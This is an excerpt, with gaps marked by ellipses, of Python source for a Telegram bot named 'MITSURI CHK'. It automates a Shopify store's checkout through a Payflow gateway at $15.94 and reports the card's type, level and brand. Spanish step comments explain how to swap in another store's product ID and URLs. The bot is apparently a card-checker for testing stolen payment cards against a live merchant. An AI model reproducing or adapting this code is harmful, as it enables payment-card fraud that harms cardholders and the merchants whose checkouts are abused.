...
@Client.on_message(filters.command("as", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
<b>あ MITSURI CHK あ
Estado: <code>ON | Free</code>
Gateway: <code>ASCLEPIO</code>
Pasarela: <code>SHOPIFY + PAYFLOW $15.94</code> </b>""")
...
あ MITSURI CHK あ
<b>Gateway: <code>ASCLEPIO</code></b>
...
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}""")
        ...
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '40037123752008'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://moonmagic.com/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://moonmagic.com/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "moonmagic.com"
        }
        ...
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=38492307528&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=1590&checkout_submitted_request_url=https%3A%2F%2Fmoonmagic.com%2F12899833%2Fcheckouts%2F8ee280d779fbf00bf84b8e2e46b8fd79&checkout_submitted_page_id=38a1a99d-6F46-4576-1D16-3E36F5E93538&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=965&checkout%5Bclient_details%5D%5Bbrowser_height%5D=738&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
...
<b>MITSURI CHK - SH + PAYFLOW $15.94 USD</b>
